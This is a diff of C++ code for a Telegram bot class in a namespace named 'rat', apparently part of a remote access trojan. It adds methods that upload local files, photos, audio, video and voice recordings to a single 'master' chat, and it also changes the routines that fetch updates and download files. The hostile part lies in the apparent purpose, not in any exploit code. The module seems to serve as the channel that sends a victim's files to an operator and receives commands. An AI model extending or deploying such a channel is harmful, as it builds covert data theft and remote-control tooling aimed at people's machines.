@@ -7,6 +7,7 @@
 #include <fstream>
 
 #include "logging.hpp"
+#include "rat/tbot/types.hpp"
 
 namespace rat::tbot {
 
@@ -67,18 +68,24 @@ static inline Update _parseJsonToUpdate(const json& update_json) {
 
 // ------------------------ Bot methods ------------------------
 
-Bot::Bot(const std::string& arg_Token, int64_t Master_Id)
+Bot::Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timemout)
     : token(arg_Token),
       master_id(Master_Id),
       last_update_id(0),
       update_interval(1000),
       curl_client() {
 
-    sending_message_url_base = fmt::format("{}{}/sendMessage?chat_id={}&text=", TELEGRAM_BOT_API_BASE_URL, token, master_id);
-    sending_document_url     = fmt::format("{}{}/sendDocument?chat_id={}", TELEGRAM_BOT_API_BASE_URL, token, master_id);
-    sending_photo_url        = fmt::format("{}{}/sendPhoto?chat_id={}", TELEGRAM_BOT_API_BASE_URL, token, master_id);
+    this->sending_message_url_base = fmt::format("{}{}/sendMessage?chat_id={}&text=", TELEGRAM_BOT_API_BASE_URL, token,master_id);
+    
+    this->sending_document_url     = fmt::format("{}{}/sendDocument", TELEGRAM_BOT_API_BASE_URL, token);
+    this->sending_photo_url        = fmt::format("{}{}/sendPhoto", TELEGRAM_BOT_API_BASE_URL, token);
+    
+    this->sending_audio_url        = fmt::format("{}{}/sendAudio", TELEGRAM_BOT_API_BASE_URL, token);
+    this->sending_video_url        = fmt::format("{}{}/sendVideo", TELEGRAM_BOT_API_BASE_URL, token);
+    
+    this->sending_voice_url        = fmt::format("{}{}/sendVoice", TELEGRAM_BOT_API_BASE_URL, token);
     getting_file_url         = fmt::format("{}{}/getFile?file_id=", TELEGRAM_BOT_API_BASE_URL, token);
-    getting_update_url       = fmt::format("{}{}/getUpdates?timeout=1&limit=1", TELEGRAM_BOT_API_BASE_URL, token);
+    getting_update_url       = fmt::format("{}{}/getUpdates?timeout={}&limit=1", TELEGRAM_BOT_API_BASE_URL, token, Telegram_Connection_Timemout);
 }
 Bot::Bot(const Bot& other)
     : token(other.token),
@@ -86,9 +93,15 @@ Bot::Bot(const Bot& other)
       curl_client() {}
 
 
-std::string Bot::getToken() const { return token; }
-int64_t Bot::getMasterId() const { return master_id; }
-int64_t Bot::getLastUpdateId() const { return last_update_id; }
+std::string Bot::getToken() const { 
+    return token; 
+}
+int64_t Bot::getMasterId() const {
+    return master_id; 
+}
+int64_t Bot::getLastUpdateId() const { 
+    return last_update_id; 
+}
 
 void Bot::setUpdateIterval(uint16_t Update_Interval) {
     update_interval = Update_Interval;
@@ -143,46 +156,202 @@ BotResponse Bot::sendMessage(const std::string& Text_Message) {
         return BotResponse::CONNECTION_ERROR;
     }
 }
-
-BotResponse Bot::sendFile(const std::filesystem::path& File_Path) {
+BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption) {
     try {
         DEBUG_LOG("Uploading file: {}", File_Path.string());
-        bool result = curl_client.uploadMimeFile(File_Path, sending_document_url, "document");
+
+        std::string extension = File_Path.extension().string();
+        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower); // make lowercase
+
+        // Route to specialized methods
+        if (extension == ".jpg" || extension == ".jpeg" || extension == ".png") {
+            return this->sendPhoto(File_Path, arg_Caption);
+        } else if (extension == ".mp3" || extension == ".m4a") {
+            return this->sendAudio(File_Path, arg_Caption);
+        } else if (extension == ".ogg") {
+            return this->sendVoice(File_Path, arg_Caption);
+        } else if (extension == ".mp4") {
+            return this->sendVideo(File_Path, arg_Caption);
+        }
+
+        // Otherwise, treat it as a generic document
+        rat::networking::MimeContext ctx;
+        ctx.file_path       = File_Path;
+        ctx.url             = sending_document_url;
+        ctx.file_field_name = "document";
+        ctx.fields_map      = { {"chat_id", std::to_string(master_id)} };
+
+        if (!arg_Caption.empty()) {
+            ctx.fields_map["caption"] = arg_Caption;
+        }
+
+        // Map common MIME types 
+        if (extension == ".txt") ctx.mime_type = "text/plain";
+	      else if (extension == ".pdf") ctx.mime_type = "application/pdf";
+	      else if (extension == ".zip") ctx.mime_type = "application/zip";
+	      else if (extension == ".rar") ctx.mime_type = "application/vnd.rar";
+	      else if (extension == ".7z") ctx.mime_type = "application/x-7z-compressed";
+	      else if (extension == ".csv") ctx.mime_type = "text/csv";
+	      else if (extension == ".json") ctx.mime_type = "application/json";
+	      else if (extension == ".xml") ctx.mime_type = "application/xml";
+	      else if (extension == ".doc") ctx.mime_type = "application/msword";
+	      else if (extension == ".docx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
+	      else if (extension == ".xls") ctx.mime_type = "application/vnd.ms-excel";
+	      else if (extension == ".xlsx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
+	      else if (extension == ".ppt") ctx.mime_type = "application/vnd.ms-powerpoint";
+	      else if (extension == ".pptx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
+	      else if (extension == ".wav") ctx.mime_type = "audio/wav";
+	      else if (extension == ".mov") ctx.mime_type = "video/quicktime";
+	      else if (extension == ".avi") ctx.mime_type = "video/x-msvideo";
+	      else ctx.mime_type = "application/octet-stream"; // fallback
+	
+        bool result = curl_client.uploadMimeFile(ctx);
+        if (!result) {
+            ERROR_LOG("Failed at uploading file: {}", File_Path.string());
+        }
+
         return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+
     } catch (const std::exception& e) {
         ERROR_LOG("sendFile exception: {}", e.what());
         return BotResponse::CONNECTION_ERROR;
     }
 }
 
-BotResponse Bot::sendPhoto(const std::filesystem::path& Photo_Path) {
+BotResponse Bot::sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption) {
     try {
         DEBUG_LOG("Uploading photo: {}", Photo_Path.string());
-        bool result = curl_client.uploadMimeFile(Photo_Path, sending_photo_url, "document");
+        
+        rat::networking::MimeContext ctx;
+        ctx.file_path = Photo_Path;
+        ctx.url = sending_photo_url;  // URL without chat_id now
+        ctx.file_field_name = "photo";
+        ctx.fields_map = {
+            {"chat_id", std::to_string(master_id)}
+            // Can add more fields like "caption", "parse_mode", etc.
+        };
+        
+        bool result = curl_client.uploadMimeFile(ctx);
+        if (!result) {
+            ERROR_LOG("Failed at uploading {}", Photo_Path.string());
+        }
         return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
     } catch (const std::exception& e) {
         ERROR_LOG("sendPhoto exception: {}", e.what());
         return BotResponse::CONNECTION_ERROR;
     }
 }
+// ------------------------ Audio ------------------------
+BotResponse Bot::sendAudio(const std::filesystem::path& Audio_Path, const std::string& arg_Caption) {
+    try {
+        DEBUG_LOG("Uploading audio: {}", Audio_Path.string());
+
+        rat::networking::MimeContext ctx;
+        ctx.file_path       = Audio_Path;
+        ctx.url             = sending_audio_url;  // Telegram API sendAudio endpoint
+        ctx.file_field_name = "audio";
+        ctx.fields_map = {
+            {"chat_id", std::to_string(master_id)}
+        };
+
+        if (!arg_Caption.empty()) {
+            ctx.fields_map["caption"] = arg_Caption;
+        }
+
+        // Optionally set MIME type
+        ctx.mime_type = "audio/mpeg"; // default for mp3/m4a
+
+        bool result = curl_client.uploadMimeFile(ctx);
+        if (!result) {
+            ERROR_LOG("Failed at uploading audio: {}", Audio_Path.string());
+        }
+        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+
+    } catch (const std::exception& e) {
+        ERROR_LOG("sendAudio exception: {}", e.what());
+        return BotResponse::CONNECTION_ERROR;
+    }
+}
+
+// ------------------------ Video ------------------------
+BotResponse Bot::sendVideo(const std::filesystem::path& Video_Path, const std::string& arg_Caption) {
+    try {
+        DEBUG_LOG("Uploading video: {}", Video_Path.string());
+
+        rat::networking::MimeContext ctx;
+        ctx.file_path       = Video_Path;
+        ctx.url             = sending_video_url;  // Telegram API sendVideo endpoint
+        ctx.file_field_name = "video";
+        ctx.fields_map = {
+            {"chat_id", std::to_string(master_id)}
+        };
+
+        if (!arg_Caption.empty()) {
+            ctx.fields_map["caption"] = arg_Caption;
+        }
+
+        ctx.mime_type = "video/mp4"; // default for mp4
+
+        bool result = curl_client.uploadMimeFile(ctx);
+        if (!result) {
+            ERROR_LOG("Failed at uploading video: {}", Video_Path.string());
+        }
+        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+
+    } catch (const std::exception& e) {
+        ERROR_LOG("sendVideo exception: {}", e.what());
+        return BotResponse::CONNECTION_ERROR;
+    }
+}
+
+// ------------------------ Voice ------------------------
+BotResponse Bot::sendVoice(const std::filesystem::path& Voice_Path, const std::string& arg_Caption) {
+    try {
+        DEBUG_LOG("Uploading voice message: {}", Voice_Path.string());
+
+        rat::networking::MimeContext ctx;
+        ctx.file_path       = Voice_Path;
+        ctx.url             = sending_voice_url;  // Telegram API sendVoice endpoint
+        ctx.file_field_name = "voice";
+        ctx.fields_map = {
+            {"chat_id", std::to_string(master_id)}
+        };
+
+        if (!arg_Caption.empty()) {
+            ctx.fields_map["caption"] = arg_Caption;
+        }
+
+        ctx.mime_type = "audio/ogg"; // default for Telegram voice messages
+
+        bool result = curl_client.uploadMimeFile(ctx);
+        if (!result) {
+            ERROR_LOG("Failed at uploading voice message: {}", Voice_Path.string());
+        }
+        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
+
+    } catch (const std::exception& e) {
+        ERROR_LOG("sendVoice exception: {}", e.what());
+        return BotResponse::CONNECTION_ERROR;
+    }
+}
+
 
 bool Bot::downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) {
     try {
-        std::string get_file_url = getting_file_url + File_Id;
-
+        std::string get_file_url = fmt::format("{}{}", getting_file_url , File_Id);
 
         FileOperationResponseBuffer response_data;
-        size_t bytes_read = curl_client.sendHttpRequest(get_file_url, response_data.data(), response_data.size());
+        size_t bytes_read = this->curl_client.sendHttpRequest(get_file_url, response_data.data(), response_data.size());
 
         if (bytes_read == 0) return false;
-
-        auto resp_json = json::parse(response_data.data(), response_data.data() + response_data.size());
+        DEBUG_LOG("Bytes that were retrieved from the https request {}", bytes_read);
+        auto resp_json = json::parse(response_data.data(), response_data.data() + bytes_read);
         if (!resp_json.value("ok", false)) return false;
 
         std::string file_path = resp_json["result"]["file_path"].get<std::string>();
         std::string file_url  = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);
 
-        auto file_data = curl_client.sendHttpRequest(file_url);
+        auto file_data = this->curl_client.sendHttpRequest(file_url);
 
         std::ofstream ofs(Out_Path, std::ios::binary);
         if (!ofs) return false;
